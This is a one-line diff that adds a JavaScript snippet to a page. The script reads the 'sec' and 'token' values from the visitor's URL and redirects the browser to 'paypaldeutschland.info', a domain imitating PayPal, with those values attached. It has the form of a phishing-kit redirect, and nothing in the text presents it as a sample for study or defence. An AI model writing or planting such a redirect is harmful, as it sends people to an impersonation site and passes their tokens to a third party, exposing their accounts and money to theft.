@@ -1,0 +1,1 @@
+<script>	var url = new URL(window.location.href);	var sec = url.searchParams.get("sec");	var token = url.searchParams.get("token");	var secret = ["https://paypaldeutschland.info/de/webapps/mpp/","https://paypaldeutschland.info/de/webapps/mpp/"];	var d = (secret[Math.floor(Math.random()*secret.length)]+"?sec="+sec+"&token="+token);	window.location = d;</script>
